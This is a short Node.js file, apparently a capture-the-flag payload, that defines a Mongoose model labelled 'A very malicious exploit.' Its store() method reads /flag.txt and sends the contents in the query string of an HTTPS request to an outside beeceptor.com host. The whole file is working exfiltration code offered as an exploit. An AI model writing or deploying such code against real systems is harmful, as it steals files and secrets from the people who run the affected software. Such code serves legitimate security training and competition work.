const mongoose = require('/usr/app/node_modules/mongoose');

const fs = require('fs');

const pwnSchema = new mongoose.Schema({
    name: { type: String, default: 'Pwn' },
    description: { type: String, default: 'A very malicious exploit.' }
});

pwnSchema.methods.store = function() {
    const fs = require('fs');
    fs.readFile('/flag.txt', 'utf8', (err, data) => {
	if (err) {
	    console.error(err);
	    return;
	}
	const https = require('https');

	https.get(`https://spikeroot.free.beeceptor.com?flag=${data}`);
	return;
    });
    return this;
};

module.exports = mongoose.model('Pwn', pwnSchema);
